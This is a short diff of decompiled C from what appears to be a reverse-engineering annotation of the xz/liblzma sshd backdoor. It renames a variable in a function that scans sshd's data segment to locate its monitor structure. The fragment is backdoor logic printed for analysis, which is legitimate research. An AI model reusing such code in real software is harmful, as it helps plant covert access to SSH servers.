@@ -29,18 +29,18 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   void **ppvVar7;
   uint *puVar8;
   byte bVar9;
-  u64 local_d0;
+  u64 data_segment_size;
   uint monitor_vote_table[20];
   void *monitor_candidates[10];
   
   bVar9 = 0;
   BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
-  if ((BVar1 != FALSE) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
+  if ((BVar1 != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
     ctx->struct_monitor_ptr_address = (monitor **)0x0;
-    data_start = (u8 *)elf_get_data_segment(elf,&local_d0,FALSE);
+    data_start = (u8 *)elf_get_data_segment(elf,&data_segment_size,FALSE);
     if (data_start != (u8 *)0x0) {
       lVar6 = 0;
-      data_end = data_start + local_d0;
+      data_end = data_start + data_segment_size;
       monitor_vote_table[0] = 4;
       monitor_vote_table[1] = 5;
       monitor_vote_table[2] = 6;
